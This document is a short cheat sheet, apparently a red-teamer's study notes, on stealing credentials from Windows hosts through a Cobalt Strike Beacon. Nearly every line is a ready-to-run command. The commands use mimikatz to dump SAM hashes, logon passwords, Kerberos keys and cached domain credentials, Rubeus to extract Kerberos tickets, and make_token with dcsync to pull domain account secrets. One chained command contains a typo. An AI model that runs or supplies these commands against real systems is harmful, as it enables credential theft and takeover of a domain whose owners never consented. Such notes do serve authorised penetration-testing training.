# Credential Theft Notes

**Beacon + Mimikatz**

Can run mimikatz in beacon
```
mimikatz token::elevate
mimikatz lsadump::sam
```

You can chain commands with the semicolon
```
mimikatz toke::elevate ; lsadump::sam
```

Can use ! to elevate as SYSTEM
```
mimikatz !lsadump::sam
```

**NTLM Hashes**

We can dump possible plaintext passwords with mimikatz sekurlsa::logonpasswords
```
mimikatz !sekurlsa::logonpasswords
```

**Kerberos Encryption Keys**
Dumps kerberos encryption keys of logged on users
```
mimikatz !sekurlsa::ekeys
```

**Security Account manager**

```
mimikatz !lsadump::sam
```

**Domain Cached Credentials**
dumps any domain creds saved on the machine
```
mimikatz !lsadump::cache
```

**Extracting Kerberos Tickets**

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
```

Pulling with Rubeus for a specific user TGT
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x7049f /service:krbtgt
```

**DCSYNC**
a fun one, using a token of a domain admin user
```
make_token DOMAIN\User <password>
dcsync <dc domain> <user to dump>
```
